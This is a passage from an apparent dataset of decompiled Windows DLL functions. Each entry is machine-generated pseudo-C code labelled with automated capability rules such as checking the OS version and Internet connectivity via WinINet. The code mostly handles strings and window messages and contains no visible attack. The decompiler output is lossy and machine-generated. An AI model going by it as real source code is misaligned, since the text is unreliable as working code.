fcn.1800b3528();\n                pcVar10 = swi(3);\n                (*pcVar10)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar9);\n    }\n    if (0xf < uStack152) {\n        iVar22 = CONCAT71(Stack175, uStack176);\n        iVar9 = iVar22;\n        if ((uStack152 + 1 < 0x1000) || (iVar9 = *(iVar22 + -8),  (iVar22 - iVar9) - 8U < 0x20)) {\n            fcn.18008fb24(iVar9);\n            goto code_r0x000180038188;\n        }\ncode_r0x000180038995:\n        fcn.1800b3528();\ncode_r0x00018003899b:\n        fcn.1800b3528();\ncode_r0x0001800389a1:\n        fcn.1800b3528();\ncode_r0x0001800389a7:\n        fcn.1800b3528();\ncode_r0x0001800389ad:\n        fcn.1800b3528();\n        pcVar10 = swi(3);\n        (*pcVar10)();\n        return;\n    }\ncode_r0x000180038188:\n    uStack160 = 0;\n    uStack152 = 0xf;\n    uStack176 = 0;\n    if (0x7 < puStack240) {\n        iVar22 = CONCAT62(Stack262, uStack264);\n        iVar9 = iVar22;\n        if ((0xfff < puStack240 * 2 + 2U) && (iVar9 = *(iVar22 + -8),  0x1f < (iVar22 - iVar9) - 8U))\n        goto code_r0x00018003899b;\n        fcn.18008fb24(iVar9);\n    }\n    puStack248 = NULL;\n    puStack240 = 0x7;\n    uStack264 = 0;\n    if (0xf < uStack208) {\n        iVar22 = CONCAT44(uStack228, uStack232);\n        iVar9 = iVar22;\n        if ((0xfff < uStack208 + 1) && (iVar9 = *(iVar22 + -8),  0x1f < (iVar22 - iVar9) - 8U))\n        goto code_r0x0001800389a1;\n        fcn.18008fb24(iVar9);\n    }\n    uStack216 = 0;\n    uStack208 = 0xf;\n    uStack232 = uStack232 & 0xffffff00;\n    if (0xf < uStack56) {\n        iVar22 = CONCAT71(Stack79, uStack80);\n        iVar9 = iVar22;\n        if ((0xfff < uStack56 + 1) && (iVar9 = *(iVar22 + -8),  0x1f < (iVar22 - iVar9) - 8U))\n        goto code_r0x0001800389a7;\n        fcn.18008fb24(iVar9);\n    }\n    uStack64 = CONCAT44(*0x180101914, *0x180101910);\n    uStack56 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack80 = 0;\n    if (0xf < uStack120) {\n        iVar22 = CONCAT71(Stack143, uStack144);\n        iVar9 = iVar22;\n        if ((0xfff < uStack120 + 1) && (iVar9 = *(iVar22 + -8),  0x1f < (iVar22 - iVar9) - 8U))\n        goto code_r0x0001800389ad;\n        fcn.18008fb24(iVar9);\n    }\n    uStack128 = 0;\n    uStack120 = 0xf;\n    uStack144 = 0;\ncode_r0x0001800388c3:\n    puVar19 = CONCAT44(uStack84, uStack88);\n    if (0xf < puVar19) {\n        iVar22 = CONCAT71(Stack111, uStack112);\n        iVar9 = iVar22;\n        puVar14 = puVar19 + 1;\n        if (0xfff < puVar19 + 1) {\n            iVar9 = *(iVar22 + -8);\n            puVar14 = puVar19 + 0x28;\n            if (0x1f < (iVar22 - iVar9) - 8U) {\n                fcn.1800b3528();\ncode_r0x000180038959:\n                fcn.1800b3528();\n                goto code_r0x00018003895f;\n            }\n        }\n        puVar19 = puVar14;\n        fcn.18008fb24(iVar9);\n    }\n    uStack96 = *0x180101910;\n    uStack92 = *0x180101914;\n    uStack88 = *0x180101918;\n    uStack84 = *0x18010191c;\n    uStack112 = 0;\ncode_r0x000180038917:\n    fcn.18003c0b0(auStack200, puVar19);\n    fcn.18008fb00(uStack48 ^ auStack712);\n    return;\n}\n",
        "token_count": 7781
    },
    "1800389c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800389c0(int64_t arg1)\n\n{\n    code *pcVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    ulong uVar6;\n    ulong *arg2;\n    uint32_t *puVar7;\n    int64_t *piVar8;\n    uchar *arg1_00;\n    int64_t *arg1_01;\n    int64_t iVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    uint32_t uVar12;\n    int64_t iVar13;\n    int32_t iVar14;\n    uchar auStack488 [32];\n    uchar *puStack456;\n    ulong uStack448;\n    uint32_t uStack440;\n    uchar uStack432;\n    unkbyte7 Stack431;\n    ulong uStack416;\n    uint64_t uStack408;\n    uint32_t uStack400;\n    uint32_t uStack396;\n    uint32_t uStack392;\n    uint32_t uStack388;\n    ulong uStack384;\n    uint64_t uStack376;\n    ulong uStack368;\n    ulong uStack352;\n    uint64_t uStack344;\n    int64_t iStack336;\n    int64_t iStack328;\n    int64_t aiStack320 [3];\n    uint64_t uStack296;\n    uint32_t uStack288;\n    uint32_t uStack284;\n    uint32_t uStack280;\n    uint32_t uStack276;\n    uint32_t uStack272;\n    uint32_t uStack268;\n    uint32_t uStack264;\n    uint32_t uStack260;\n    ulong uStack256;\n    int64_t *piStack248;\n    uchar auStack232 [128];\n    uchar auStack104 [16];\n    int64_t iStack88;\n    uint32_t uStack80;\n    uint32_t uStack76;\n    uint32_t uStack72;\n    uint32_t uStack68;\n    int64_t iStack64;\n    uint64_t uStack56;\n    uint64_t uStack48;\n    \n    uStack256 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack488;\n    uVar12 = 0;\n    uStack440 = 0;\n    uVar6 = *(arg1 + 0xa8);\n    iStack328 = arg1;\n    (**0x1800de7f0)(uVar6, 0x14b, 0, 0);\n    (**0x1800de7f0)(uVar6, 0x143, 0, 0x1800f6554);\n    (**0x1800de7f0)(uVar6, 0x14e, 0, 0);\n    (**0x1800de5b8)(uVar6, 0, 0);\n    (**0x1800de778)(*(arg1 + 0xb0), 0x1800f66cc);\n    iVar3 = (**0x1800de740)(*(arg1 + 0x18), 0x25be);\n    auStack104 = ZEXT816(0);\n    iStack88 = 0;\n    iVar11 = arg1 + 0x38;\n    piVar8 = aiStack320;\n    iStack336 = iVar11;\n    uVar6 = fcn.18000de50(piVar8, iVar11);\n    iVar4 = fcn.180008fa0(piVar8, auStack104, uVar6);\n    iVar14 = 0;\n    if (0 < iVar4) {\n        do {\n            iStack64 = 0;\n            uStack56 = 0xf;\n            uStack80 = uStack80 & 0xffffff00;\n            piStack248 = aiStack320;\n            uVar6 = fcn.18000de50(aiStack320, iVar11);\n            uStack352 = 0;\n            uStack344 = 0xf;\n            uStack368._0_1_ = 0;\n            fcn.180011120(&uStack368, 0x1800f46fe, 0);\n            uStack416 = 0;\n            uStack408 = 0xf;\n            uStack432 = 0;\n            arg1_00 = &uStack432;\n            fcn.180011120(arg1_00, 0x1800f74a0, 8);\n            iVar11 = iVar14 * 0x20;\n            puStack456 = &uStack368;\n            uStack448 = uVar6;\n            arg2 = fcn.180004b90(arg1_00, &uStack400, auStack104._0_8_ + iVar11, &uStack432);\n            piVar8 = arg2 + 2;\n            if (0xf < arg2[3]) {\n                arg2 = *arg2;\n            }\n            arg1_01 = arg1 + 0x58;\n            if (0xf < *(arg1 + 0x70)) {\n                arg1_01 = *(arg1 + 0x58);\n            }\n            if ((*(arg1 + 0x68) == *piVar8) && (iVar5 = fcn.1800ae4d0(arg1_01, arg2, *(arg1 + 0x68)),  iVar5 == 0)) {\n                bVar2 = true;\n            }\n            else {\n                bVar2 = false;\n            }\n            if (0xf < uStack376) {\n                iVar13 = CONCAT44(uStack396, uStack400);\n                iVar9 = iVar13;\n                if ((0xfff < uStack376 + 1) && (iVar9 = *(iVar13 + -8),  0x1f < (iVar13 - iVar9) - 8U))\n                goto code_r0x000180039139;\n                fcn.18008fb24(iVar9);\n            }\n            uStack384 = 0;\n            uStack376 = 0xf;\n            uStack400 = uStack400 & 0xffffff00;\n            if (0xf < uStack408) {\n                iVar13 = CONCAT71(Stack431, uStack432);\n                iVar9 = iVar13;\n                if ((0xfff < uStack408 + 1) && (iVar9 = *(iVar13 + -8),  0x1f < (iVar13 - iVar9) - 8U))\n                goto code_r0x00018003913f;\n                fcn.18008fb24(iVar9);\n            }\n            uStack416 = 0;\n            uStack408 = 0xf;\n            uStack432 = 0;\n            if (0xf < uStack344) {\n                iVar13 = CONCAT71(uStack368._1_7_, uStack368);\n                iVar9 = iVar13;\n                if ((0xfff < uStack344 + 1) && (iVar9 = *(iVar13 + -8),  0x1f < (iVar13 - iVar9) - 8U))\n                goto code_r0x000180039145;\n                fcn.18008fb24(iVar9);\n            }\n            if (iVar3 == 1) {\n                if (bVar2) {\n                    puVar7 = fcn.18000de50(aiStack320, auStack104._0_8_ + iVar11);\n                    uVar12 = uVar12 | 1;\n                }\n                else {\n                    uStack352 = 0;\n                    uStack344 = 0xf;\n                    uStack368._0_1_ = 0;\n                    fcn.180011120(&uStack368, 0x1800f46ff, 0);\n                    puVar7 = &uStack368;\n                    uVar12 = uVar12 | 2;\n                }\n                uStack288 = *puVar7;\n                uStack284 = puVar7[1];\n                uStack280 = puVar7[2];\n                uStack276 = puVar7[3];\n                uStack272 = puVar7[4];\n                uStack268 = puVar7[5];\n                uStack264 = puVar7[6];\n                uStack260 = puVar7[7];\n                *(puVar7 + 4) = 0;\n                *(puVar7 + 6) = 0xf;\n                *puVar7 = 0;\n                puVar7 = &uStack288;\n                uVar12 = uVar12 | 4;\n            }\n            else {\n                iVar9 = 0x1800f74c0;\n                if (bVar2) {\n                    iVar9 = 0x1800f470e;\n                }\n                uStack416 = 0;\n                uStack408 = 0xf;\n                uStack432 = 0;\n                iVar13 = -1;\n                do {\n                    iVar13 = iVar13 + 1;\n                } while (*(iVar9 + iVar13) != '\\0');\n                fcn.180011120(&uStack432, iVar9, iVar13);\n                uStack440 = uVar12 | 8;\n                puVar7 = fcn.18000dc30(&uStack432, iVar11 + auStack104._0_8_);\n                uStack400 = *puVar7;\n                uStack396 = puVar7[1];\n                uStack392 = puVar7[2];\n                uStack388 = puVar7[3];\n                uStack384 = *(puVar7 + 4);\n                uStack376 = *(puVar7 + 6);\n                *(puVar7 + 4) = 0;\n                *(puVar7 + 6) = 0xf;\n                *puVar7 = 0;\n                puVar7 = &uStack400;\n                uVar12 = uVar12 | 0x38;\n            }\n            uStack440 = uVar12;\n            if (0xf < uStack56) {\n                iVar9 = CONCAT44(uStack76, uStack80);\n                iVar11 = iVar9;\n                if ((0xfff < uStack56 + 1) && (iVar11 = *(iVar9 + -8),  0x1f < (iVar9 - iVar11) - 8U))\n                goto code_r0x00018003914b;\n                fcn.18008fb24(iVar11);\n            }\n            uStack80 = *puVar7;\n            uStack76 = puVar7[1];\n            uStack72 = puVar7[2];\n            uStack68 = puVar7[3];\n            iStack64 = *(puVar7 + 4);\n            uStack56 = *(puVar7 + 6);\n            *(puVar7 + 4) = 0;\n            *(puVar7 + 6) = 0xf;\n            *puVar7 = 0;\n            if (((uVar12 & 0x10) != 0) && (uVar12 = uVar12 & 0xffffffef,  uStack440 = uVar12,  0xf < uStack376)) {\n                iVar9 = CONCAT44(uStack396, uStack400);\n                iVar11 = iVar9;\n                if ((0xfff < uStack376 + 1) && (iVar11 = *(iVar9 + -8),  0x1f < (iVar9 - iVar11) - 8U))\n                goto code_r0x00018003914b;\n                fcn.18008fb24(iVar11);\n            }\n            if ((uVar12 & 8) != 0) {\n                uVar12 = uVar12 & 0xfffffff7;\n                uStack440 = uVar12;\n                if (0xf < uStack408) {\n                    iVar9 = CONCAT71(Stack431, uStack432);\n                    iVar11 = iVar9;\n                    if ((0xfff < uStack408 + 1) && (iVar11 = *(iVar9 + -8),  0x1f < (iVar9 - iVar11) - 8U))\n                    goto code_r0x000180039151;\n                    fcn.18008fb24(iVar11);\n                }\n                uStack416 = 0;\n                uStack408 = 0xf;\n                uStack432 = 0;\n            }\n            if ((uVar12 & 4) != 0) {\n                uVar12 = uVar12 & 0xfffffffb;\n                uStack440 = uVar12;\n                if (0xf < CONCAT44(uStack260, uStack264)) {\n                    iVar9 = CONCAT44(uStack284, uStack288);\n                    iVar11 = iVar9;\n                    if ((0xfff < CONCAT44(uStack260, uStack264) + 1) &&\n                       (iVar11 = *(iVar9 + -8),  0x1f < (iVar9 - iVar11) - 8U)) goto code_r0x000180039157;\n                    fcn.18008fb24(iVar11);\n                }\n            }\n            if (((uVar12 & 2) != 0) && (uVar12 = uVar12 & 0xfffffffd,  uStack440 = uVar12,  0xf < uStack344)) {\n                iVar9 = CONCAT71(uStack368._1_7_, uStack368);\n                iVar11 = iVar9;\n                if ((0xfff < uStack344 + 1) && (iVar11 = *(iVar9 + -8),  0x1f < (iVar9 - iVar11) - 8U))\n                goto code_r0x00018003915d;\n                fcn.18008fb24(iVar11);\n            }\n            if (((uVar12 & 1) != 0) && (uVar12 = uVar12 & 0xfffffffe,  uStack440 = uVar12,  0xf < uStack296)) {\n                iVar11 = aiStack320[0];\n                if ((0xfff < uStack296 + 1) && (iVar11 = *(aiStack320[0] + -8),  0x1f < (aiStack320[0] - iVar11) - 8U))\n                goto code_r0x000180039163;\n                fcn.18008fb24(iVar11);\n            }\n            if (iStack64 != 0) {\n                uVar6 = fcn.1800687b0(auStack232);\n                puVar7 = &uStack80;\n                if (0xf < uStack56) {\n                    puVar7 = CONCAT44(uStack76, uStack80);\n                }\n                fcn.180069050(uVar6, &uStack400, puVar7, iStack64 + puVar7);\n                uVar12 = uVar12 | 0xc0;\n                uStack440 = uVar12;\n                fcn.1800686c0(auStack232);\n                puVar7 = &uStack400;\n                if (7 < uStack376) {\n                    puVar7 = CONCAT44(uStack396, uStack400);\n                }\n                (**0x1800de7f0)(*(iStack328 + 0xa8), 0x143, 0, puVar7);\n                if (7 < uStack376) {\n                    iVar9 = CONCAT44(uStack396, uStack400);\n                    iVar11 = iVar9;\n                    if (0xfff < uStack376 * 2 + 2) {\n                        iVar11 = *(iVar9 + -8);\n                        if (0x1f < (iVar9 - iVar11) - 8U) {\n                            fcn.1800b3528(iVar11, uStack376 * 2 + 0x29);\n                            goto code_r0x00018003916f;\n                        }\n                    }\n                    fcn.18008fb24(iVar11);\n                }\n            }\n            if (0xf < uStack56) {\n                iVar9 = CONCAT44(uStack76, uStack80);\n                iVar11 = iVar9;\n                if ((0xfff < uStack56 + 1) && (iVar11 = *(iVar9 + -8),  0x1f < (iVar9 - iVar11) - 8U)) {\ncode_r0x00018003916f:\n                    fcn.1800b3528();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                fcn.18008fb24(iVar11);\n            }\n            iVar14 = iVar14 + 1;\n            iVar11 = iStack336;\n        } while (iVar14 < iVar4);\n    }\n    if (auStack104._0_8_ != 0) {\n        fcn.180013b30(auStack104._0_8_, auStack104._8_8_);\n        uVar10 = iStack88 - auStack104._0_8_ & 0xffffffffffffffe0;\n        iVar11 = auStack104._0_8_;\n        if (0xfff < uVar10) {\n            iVar11 = *(auStack104._0_8_ + -8);\n            if (0x1f < (auStack104._0_8_ - iVar11) - 8U) {\n                fcn.1800b3528(iVar11, uVar10 + 0x27);\ncode_r0x000180039139:\n                fcn.1800b3528();\ncode_r0x00018003913f:\n                fcn.1800b3528();\ncode_r0x000180039145:\n                fcn.1800b3528();\ncode_r0x00018003914b:\n                fcn.1800b3528();\ncode_r0x000180039151:\n                fcn.1800b3528();\ncode_r0x000180039157:\n                fcn.1800b3528();\ncode_r0x00018003915d:\n                fcn.1800b3528();\ncode_r0x000180039163:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar11);\n    }\n    fcn.18008fb00(uStack48 ^ auStack488);\n    return;\n}\n",
        "token_count": 3976
    },
    "18003918": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180039180(int64_t arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    ulong uVar4;\n    int64_t *piVar5;\n    ulong *puVar6;\n    int32_t iVar7;\n    int64_t *piVar8;\n    uchar *puVar9;\n    ulong ****ppppuVar10;\n    int64_t iVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    int64_t iVar14;\n    int64_t iVar15;\n    ulong *puVar16;\n    int64_t iVar17;\n    int64_t iVar18;\n    uint32_t uVar19;\n    uchar auStack584 [32];\n    uchar *puStack552;\n    ulong uStack544;\n    uchar uStack536;\n    unkbyte7 Stack535;\n    int64_t iStack520;\n    uint64_t uStack512;\n    uint32_t uStack504;\n    uint32_t uStack500;\n    uchar uStack496;\n    unkbyte7 Stack495;\n    ulong uStack480;\n    uint64_t uStack472;\n    int64_t *piStack464;\n    uchar uStack456;\n    unkbyte7 Stack455;\n    ulong uStack440;\n    uint64_t uStack432;\n    int64_t iStack424;\n    int64_t *piStack416;\n    int64_t *piStack408;\n    uchar uStack400;\n    unkbyte7 Stack399;\n    ulong uStack384;\n    uint64_t uStack376;\n    int64_t aiStack368 [3];\n    uint64_t uStack344;\n    int64_t iStack336;\n    int64_t iStack328;\n    int64_t aiStack320 [4];\n    ulong uStack288;\n    int64_t aiStack280 [4];\n    uchar auStack248 [128];\n    char acStack120 [8];\n    uchar uStack112;\n    unkbyte7 Stack111;\n    int64_t iStack96;\n    uint64_t uStack88;\n    ulong ****appppuStack80 [2];\n    uint64_t uStack64;\n    uint64_t uStack56;\n    uint64_t uStack48;\n    \n    uStack288 = 0xfffffffffffffffe;\n    uStack48 = *0x180123080 ^ auStack584;\n    uStack504 = 0;\n    iStack336 = arg1;\n    fcn.18003a150(arg1, appppuStack80);\n    if (1 < uStack64) {\n        uVar4 = fcn.1800687b0(auStack248);\n        ppppuVar10 = appppuStack80;\n        if (0xf < uStack56) {\n            ppppuVar10 = appppuStack80[0];\n        }\n        fcn.180069050(uVar4, &uStack456, ppppuVar10, uStack64 + ppppuVar10);\n        uVar19 = 3;\n        fcn.1800686c0(auStack248);\n        puVar12 = &uStack456;\n        if (7 < uStack432) {\n            puVar12 = CONCAT71(Stack455, uStack456);\n        }\n        (**0x1800de778)(*(arg1 + 0xb0), puVar12);\n        if (uStack432 < 8) {\ncode_r0x000180039289:\n            uVar4 = (**0x1800de798)(*(arg1 + 0x18), 0x25c3);\n            (**0x1800de770)(uVar4, 1);\n            iVar2 = (**0x1800de7f0)(*(arg1 + 0xa8), 0x147, 0, 0);\n            uVar4 = (**0x1800de798)(*(arg1 + 0x18), 0x25c5);\n            (**0x1800de770)(uVar4, 0 < iVar2);\n            piStack408 = aiStack368;\n            iStack424 = arg1 + 0x38;\n            puStack552 = fcn.18000de50(aiStack368, iStack424);\n            uStack500 = 0;\n            uStack440 = CONCAT44(*0x180101914, *0x180101910);\n            uStack432 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack456 = 0;\n            puVar12 = &uStack456;\n            fcn.180011120(puVar12, 0x1800f74e0, 0xd);\n            iVar2 = fcn.1800054e0(puVar12, appppuStack80, &uStack456, &uStack500);\n            if (0xf < uStack432) {\n                iVar11 = CONCAT71(Stack455, uStack456);\n                iVar18 = iVar11;\n                if ((0xfff < uStack432 + 1) && (iVar18 = *(iVar11 + -8),  0x1f < (iVar11 - iVar18) - 8U))\n                goto code_r0x00018003a0d8;\n                fcn.18008fb24(iVar18);\n            }\n            if (iVar2 < 1) goto code_r0x00018003a056;\n            iVar7 = 0x1e;\n            if (iVar2 < 0x1f) {\n                iVar7 = iVar2;\n            }\n            piVar5 = arg1 + 0xb8;\n            iVar18 = *(arg1 + 0xc0);\n            iVar11 = *piVar5;\n            piStack408 = piVar5;\n            if (iVar11 != iVar18) {\n                do {\n                    fcn.180037040(iVar11);\n                    iVar11 = iVar11 + 0x48;\n                } while (iVar11 != iVar18);\n                iVar11 = *piVar5;\n            }\n            *(arg1 + 0xc0) = iVar11;\n            iVar2 = iVar7;\n            if (iVar7 == 0) {\n                iVar2 = (iVar11 - *piVar5) / 0x48;\n            }\n            fcn.18003bf80(piVar5, ((iVar2 + -1) / 10 + 1) * 10);\n            uStack500 = 0;\n            iStack328 = iVar7;\n            if (0 < iVar7) {\n                iVar18 = 0;\n                do {\n                    iVar11 = *piVar5 + iVar18 * 0x48;\n                    fcn.180020af0(acStack120, 4, 0x1800f74ac, uStack500);\n                    iStack96 = 0;\n                    uStack88 = 0xf;\n                    uStack112 = 0;\n                    iVar15 = -1;\n                    do {\n                        iVar14 = iVar15 + 1;\n                        iVar17 = iVar15 + 1;\n                        iVar15 = iVar14;\n                    } while (acStack120[iVar17] != '\\0');\n                    fcn.180011120(&uStack112, acStack120, iVar14);\n                    piStack464 = aiStack280;\n                    piVar5 = fcn.18000de50(aiStack280, iStack424);\n                    uStack440 = 0;\n                    uStack432 = 0xf;\n                    uStack456 = 0;\n                    piStack416 = piVar5;\n                    fcn.180011120(&uStack456, 0x1800f470f, 0);\n                    iStack520 = 0;\n                    uStack512 = 0xf;\n                    uStack536 = 0;\n                    uStack504 = uVar19 | 4;\n                    if (0xf < iStack96 + 6U) {\n                        fcn.1800137f0(&uStack536, iStack96 + 6U);\n                    }\n                    iStack520 = 0;\n                    fcn.18000dc30(&uStack536, &uStack112);\n                    if (uStack512 - iStack520 < 6) {\n                        puStack552 = 0x6;\n                        fcn.180014270(&uStack536, 6, 0, 0x1800f675c);\n                    }\n                    else {\n                        puVar12 = &uStack536;\n                        if (0xf < uStack512) {\n                            puVar12 = CONCAT71(Stack535, uStack536);\n                        }\n                        puVar12 = puVar12 + iStack520;\n                        iStack520 = iStack520 + 6;\n                        fcn.1800ade80(puVar12, 0x1800f675c, 6);\n                        puVar12[6] = 0;\n                    }\n                    puVar12 = &uStack536;\n                    if (0xf < uStack512) {\n                        puVar12 = CONCAT71(Stack535, uStack536);\n                    }\n                    uStack480 = 0;\n                    uStack472 = 0xf;\n                    uStack496 = 0;\n                    iVar15 = -1;\n                    do {\n                        iVar15 = iVar15 + 1;\n                    } while (puVar12[iVar15] != '\\0');\n                    fcn.180011120(&uStack496, puVar12, iVar15);\n                    piVar8 = aiStack320;\n                    uStack544 = fcn.18000de50(piVar8, piVar5);\n                    puStack552 = &uStack456;\n                    puVar6 = fcn.180004b90(piVar8, &uStack400, appppuStack80, &uStack496);\n                    uVar4 = fcn.1800687b0(auStack248);\n                    puVar16 = puVar6;\n                    if (0xf < puVar6[3]) {\n                        puVar16 = *puVar6;\n                    }\n                    fcn.180069050(uVar4, aiStack368, puVar16, puVar6[2] + puVar16);\n                    fcn.1800686c0(auStack248);\n                    if (0xf < uStack376) {\n                        iVar17 = CONCAT71(Stack399, uStack400);\n                        iVar15 = iVar17;\n                        if ((0xfff < uStack376 + 1) && (iVar15 = *(iVar17 + -8),  0x1f < (iVar17 - iVar15) - 8U))\n                        goto code_r0x00018003a0de;\n                        fcn.18008fb24(iVar15);\n                    }\n                    uStack384 = 0;\n                    uStack376 = 0xf;\n                    uStack400 = 0;\n                    if (0xf < piVar5[3]) {\n                        iVar15 = *piVar5;\n                        iVar17 = iVar15;\n                        if ((0xfff < piVar5[3] + 1U) && (iVar17 = *(iVar15 + -8),  0x1f < (iVar15 - iVar17) - 8U))\n                        goto code_r0x00018003a0e4;\n                        fcn.18008fb24(iVar17);\n                    }\n                    piVar5[2] = 0;\n                    piVar5[3] = 0xf;\n                    *piVar5 = 0;\n                    fcn.18000d960(iVar11, aiStack368);\n                    if (7 < uStack344) {\n                        iVar15 = aiStack368[0];\n                        if (uStack344 * 2 + 2 < 0x1000) {\ncode_r0x00018003972e:\n                            fcn.18008fb24(iVar15);\n                            goto code_r0x000180039734;\n                        }\n                        iVar15 = *(aiStack368[0] + -8);\n                        if ((aiStack368[0] - iVar15) - 8U < 0x20) goto code_r0x00018003972e;\n                        fcn.1800b3528(iVar15, uStack344 * 2 + 0x29);\ncode_r0x00018003a0f0:\n                        fcn.1800b3528();\ncode_r0x00018003a0f6:\n                        fcn.1800b3528();\ncode_r0x00018003a0fc:\n                        fcn.1800b3528();\ncode_r0x00018003a102:\n                        fcn.1800b3528();\ncode_r0x00018003a108:\n                        fcn.1800b3528();\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\ncode_r0x000180039734:\n                    if (0xf < uStack472) {\n                        iVar17 = CONCAT71(Stack495, uStack496);\n                        iVar15 = iVar17;\n                        if ((0xfff < uStack472 + 1) && (iVar15 = *(iVar17 + -8),  0x1f < (iVar17 - iVar15) - 8U))\n                        goto code_r0x00018003a0f0;\n                        fcn.18008fb24(iVar15);\n                    }\n                    uStack480 = 0;\n                    uStack472 = 0xf;\n                    uStack496 = 0;\n                    if (0xf < uStack512) {\n                        iVar17 = CONCAT71(Stack535, uStack536);\n                        iVar15 = iVar17;\n                        if ((0xfff < uStack512 + 1) && (iVar15 = *(iVar17 + -8),  0x1f < (iVar17 - iVar15) - 8U))\n                        goto code_r0x00018003a0f6;\n                        fcn.18008fb24(iVar15);\n                    }\n                    iStack520 = 0;\n                    uStack512 = 0xf;\n                    uStack536 = 0;\n                    if (0xf < uStack432) {\n                        iVar17 = CONCAT71(Stack455, uStack456);\n                        iVar15 = iVar17;\n                        if ((0xfff < uStack432 + 1) && (iVar15 = *(iVar17 + -8),  0x1f < (iVar17 - iVar15) - 8U))\n                        goto code_r0x00018003a0fc;\n                        fcn.18008fb24(iVar15);\n                    }\n                    piStack416 = aiStack320;\n                    piVar5 = fcn.18000de50(aiStack320, iStack424);\n                    uStack440 = 0;\n                    uStack432 = 0xf;\n                    uStack456 = 0;\n                    piStack464 = piVar5;\n                    fcn.180011120(&uStack456, 0x1800f471e, 0);\n                    iStack520 = 0;\n                    uStack512 = 0xf;\n                    uStack536 = 0;\n                    uStack504 = uVar19 | 0x78;\n                    if (0xf < iStack96 + 6U) {\n                        fcn.1800137f0(&uStack536, iStack96 + 6U);\n                    }\n                    iStack520 = 0;\n                    fcn.18000dc30(&uStack536, &uStack112);\n                    if (uStack512 - iStack520 < 6) {\n                        puStack552 = 0x6;\n                        fcn.180014270(&uStack536, 6, 0, 0x1800f67ec);\n                    }\n                    else {\n                        puVar12 = &uStack536;\n                        if (0xf < uStack512) {\n                            puVar12 = CONCAT71(Stack535, uStack536);\n                        }\n                        puVar12 = puVar12 + iStack520;\n                        iStack520 = iStack520 + 6;\n                        fcn.1800ade80(puVar12, 0x1800f67ec, 6);\n                        puVar12[6] = 0;\n                    }\n                    puVar12 = &uStack536;\n                    if (0xf < uStack512) {\n                        puVar12 = CONCAT71(Stack535, uStack536);\n                    }\n                    uStack480 = 0;\n                    uStack472 = 0xf;\n                    uStack496 = 0;\n                    iVar15 = -1;\n                    do {\n                        iVar15 = iVar15 + 1;\n                    } while (puVar12[iVar15] != '\\0');\n                    fcn.180011120(&uStack496, puVar12, iVar15);\n                    piVar8 = aiStack280;\n                    uStack544 = fcn.18000de50(piVar8, piVar5);\n                    puStack552 = &uStack456;\n                    puVar6 = fcn.180004b90(piVar8, &uStack400, appppuStack80, &uStack496);\n                    uVar4 = fcn.1800687b0(auStack248);\n                    puVar16 = puVar6;\n                    if (0xf < puVar6[3]) {\n                        puVar16 = *puVar6;\n                    }\n                    fcn.180069050(uVar4, aiStack368, puVar16, puVar6[2] + puVar16);\n                    fcn.1800686c0(auStack248);\n                    if (0xf < uStack376) {\n                        iVar17 = CONCAT71(Stack399, uStack400);\n                        iVar15 = iVar17;\n                        if ((0xfff < uStack376 + 1) && (iVar15 = *(iVar17 + -8),  0x1f < (iVar17 - iVar15) - 8U))\n                        goto code_r0x00018003a102;\n                        fcn.18008fb24(iVar15);\n                    }\n                    uStack384 = 0;\n                    uStack376 = 0xf;\n                    uStack400 = 0;\n                    if (0xf < piVar5[3]) {\n                        iVar15 = *piVar5;\n                        iVar17 = iVar15;\n                        if ((0xfff < piVar5[3] + 1U) && (iVar17 = *(iVar15 + -8),  0x1f < (iVar15 - iVar17) - 8U))\n                        goto code_r0x00018003a108;\n                        fcn.18008fb24(iVar17);\n                    }\n                    piVar5[2] = 0;\n                    piVar5[3] = 0xf;\n                    *piVar5 = 0;\n                    fcn.18000d960(iVar11 + 0x28, aiStack368);\n                    if (7 < uStack344) {\n                        iVar15 = aiStack368[0];\n                        if (uStack344 * 2 + 2 < 0x1000) {\ncode_r0x000180039aa1:\n                            fcn.18008fb24(iVar15);\n                            goto code_r0x000180039aa7;\n                        }\n                        iVar15 = *(aiStack368[0] + -8);\n                        if ((aiStack368[0] - iVar15) - 8U < 0x20) goto code_r0x000180039aa1;\n                        fcn.1800b3528(iVar15, uStack344 * 2 + 0x29);\ncode_r0x00018003a114:\n                        fcn.1800b3528();\ncode_r0x00018003a11a:\n                        fcn.1800b3528();\ncode_r0x00018003a120:\n                        fcn.1800b3528();\ncode_r0x00018003a126:\n                        fcn.1800b3528();\ncode_r0x00018003a12c:\n                        fcn.1800b3528();\ncode_r0x00018003a132:\n                        fcn.1800b3528();\ncode_r0x00018003a138:\n                        fcn.1800b3528();\n                        pcVar1 = swi(3);\n                        (*pcVar1)();\n                        return;\n                    }\ncode_r0x000180039aa7:\n                    if (0xf < uStack472) {\n                        iVar17 = CONCAT71(Stack495, uStack496);\n                        iVar15 = iVar17;\n                        if ((0xfff < uStack472 + 1) && (iVar15 = *(iVar17 + -8),  0x1f < (iVar17 - iVar15) - 8U))\n                        goto code_r0x00018003a114;\n                        fcn.18008fb24(iVar15);\n                    }\n                    uStack480 = 0;\n                    uStack472 = 0xf;\n                    uStack496 = 0;\n                    if (0xf < uStack512) {\n                        iVar17 = CONCAT71(Stack535, uStack536);\n                        iVar15 = iVar17;\n                        if ((0xfff < uStack512 + 1) && (iVar15 = *(iVar17 + -8),  0x1f < 